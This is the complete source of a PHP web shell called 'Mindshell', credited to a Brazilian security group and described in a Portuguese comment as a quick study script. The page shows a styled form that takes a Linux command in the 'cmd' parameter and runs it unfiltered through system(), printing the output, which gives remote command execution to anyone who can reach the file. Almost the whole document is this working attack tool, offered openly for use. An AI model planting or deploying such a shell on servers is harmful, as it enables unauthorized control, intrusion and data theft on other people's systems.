<!--
[+]Coder   : Jonathan Baskov ==Jord@rootExploit and Sr.Storm
[+]Team    : Mindsetsecurity
[+]Blog    : https://mindsetsecurity.wordpress.com
[+]git     : https://github.com/jord-baskov/
[+]contato : jordison@protonmail.com
[+]Warning!
essa Webshell é apenas um script rápido e para fins de estudo tanto meus quanto o de quem quiser usa-lo,
ainda existe muitos erros, e falta muitos complementos.

-->
<!DOCTYPE html>
<html>
<head>
	<title>◉|MINDSHELL|◉</title>
	<meta charset="utf-8">
	<link rel="shortcut icon" href="https://png.pngtree.com/svg/20160620/prompt_594302.png" type="image/png">
	<link href="https://fonts.googleapis.com/css?family=Major+Mono+Display" rel="stylesheet"> 
		<style> 
		h1 {font-family: 'Major Mono Display', monospace; color:red;}
		h3{font-family: 'Major Mono Display', monospace;}
		h4{font-family: 'Major Mono Display', monospace; color:white;}
	   input {type:text;background:rgba(0,0,.2);width: 280px;color:#ff23c4;}
		body, input {font: 11px sans regular,sans-serif;}
		body {color: #fff;text-align: center;background: #333;}
		pre{font-family: sans-serif; color:#ffff2e;}
		a{color:#7fff00;}
		textarea{color:#ffff2e; background:#000000;};
	</style>
</head>
<body>
<center>
	<center><h1>&#9763; Bem Vindo Ao Mindshell &#9763;</h1>
<h4>visite nosso blog <a href="https://mindsetsecurity.wordpress.com/"><br>◉|MindsetSecurity|◉</a></h4><br>
<img src="https://mindsetsecurity.files.wordpress.com/2018/02/cropped-1f43a.png?w=150">
<font color="silver"><h3>&#8623;Command&#8623;</h3></font>
<form method="GET" name="linha de comando">
<input type="text" name="cmd" placeholder="&#9997;Digite aqui um comando linux!">
<br>
<input type="submit" name="env" value="exec"></br>
 <pre>
<font color="yellow"><h3>&#8623;Result&#8623;</h3></font>
<textarea rows="05"  cols="80" >
<?php
	if($_GET['cmd']) {
 	system($_GET['cmd']);
  }

 ?>
</textarea>
 </pre>
</table>
</form>
</center>
</body>
</html>
